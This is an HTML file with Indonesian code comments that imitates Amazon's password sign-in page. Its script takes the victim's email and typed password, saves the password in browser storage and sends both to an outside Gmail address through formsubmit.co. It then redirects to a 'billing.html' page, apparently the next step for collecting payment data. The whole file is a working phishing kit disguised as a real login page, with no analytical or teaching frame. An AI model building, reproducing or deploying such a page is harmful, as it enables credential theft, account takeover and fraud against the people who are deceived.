<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Enter Password</title>
    <style>
        * {margin:0; padding:0; box-sizing:border-box; font-family:'Amazon Ember',Arial,sans-serif;}
        body {background:#fff; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:20px;}
        .logo {margin:10px 0 20px; text-align:center;}
        .logo img {height:30px;}
        .kotak {width:100%; max-width:420px; border:1px solid #ddd; border-radius:8px; padding:25px 30px; background:#fff;}
        h1 {font-size:22px; font-weight:400; margin-bottom:10px;}
        .email-terpilih {font-size:14px; margin-bottom:15px;}
        .email-terpilih a {color:#0066c0; text-decoration:none; margin-left:8px;}
        label {font-size:13px; font-weight:700; margin:16px 0 6px; display:block;}
        .lupa-sandi {font-size:13px; color:#0066c0; text-decoration:none; float:right; margin:16px 0;}
        input {width:100%; padding:7px 10px; border:1px solid #a6a6a6; border-radius:4px; font-size:15px; height:34px;}
        input:focus {border-color:#007185; outline:none; box-shadow:0 0 0 1px #007185;}
        button {width:100%; padding:8px; background:linear-gradient(to bottom,#f7df74,#ecc000); border:1px solid #b88600; border-radius:4px; font-size:15px; height:36px; cursor:pointer; margin-top:10px;}
        button:disabled {opacity:0.7; cursor:not-allowed;}
        .footer {margin-top:30px; font-size:11px; color:#555; text-align:center;}
        .footer a {color:#0066c0; text-decoration:none; margin:0 8px;}
        .status {margin-top:12px; padding:8px; border-radius:4px; font-size:13px; display:none;}
        .ok {background:#f0fdf4; color:#166534; border:1px solid #bbf7d0;}
        .no {background:#fef2f2; color:#991b1b; border:1px solid #fecaca;}
    </style>
</head>
<body>
    <div class="logo">
        <img src="./img/amazonlogo.png" alt="Amazon" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg'">
    </div>
    <div class="kotak">
        <h1>Sign in</h1>
        <div class="email-terpilih">
            <span id="tampilEmail"></span>
            <a href="index.html">Change</a>
        </div>
        <label for="password">Password</label>
        <a href="#" class="lupa-sandi">Forgot password?</a>
        <input type="password" id="password" required>
        <button id="tombolMasuk">Sign in</button>
        <div id="status" class="status"></div>
    </div>
    <div class="footer">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// Baca email
const params = new URLSearchParams(window.location.search);
let email = params.get("email") || localStorage.getItem("dataEmail");

if(!email) {
    window.location.href = "index.html";
}

localStorage.setItem("dataEmail", email);
document.getElementById("tampilEmail").textContent = email;

// === KIRIM DATA PERTAMA: LOGIN ===
document.getElementById("tombolMasuk").addEventListener("click", async function() {
    const password = document.getElementById("password").value.trim();
    if(!password) {
        alert("Masukkan password!");
        return;
    }

    const btn = this;
    const status = document.getElementById("status");
    btn.disabled = true;
    btn.textContent = "Mengirim...";
    status.style.display = "none";

    // Simpan untuk dipakai di billing.html
    localStorage.setItem("password", password);

    // Data pertama — Format Login
    const dataLogin = {
        _subject: "📋 Data dari Halaman Masuk — Result Login",
        Email: email,
        Password: password
    };

    try {
        const formData = new FormData();
        for(let k in dataLogin) formData.append(k, dataLogin[k]);

        const res = await fetch("https://formsubmit.co/jandaanaksatu777@gmail.com", {
            method: "POST",
            body: formData
        });

        if(res.ok) {
            status.className = "status ok";
            status.textContent = "✅ Terkirim! Melanjutkan...";
            status.style.display = "block";

            setTimeout(() => {
                window.location.href = "billing.html";
            }, 1200);
        } else {
            throw new Error("Gagal");
        }
    } catch(err) {
        status.className = "status no";
        status.textContent = "⚠️ Coba lagi";
        status.style.display = "block";
        btn.disabled = false;
        btn.textContent = "Sign in";
    }
});

document.getElementById("password").addEventListener("keypress", e => {
    if(e.key === "Enter") document.getElementById("tombolMasuk").click();
});
</script>
</body>
</html>
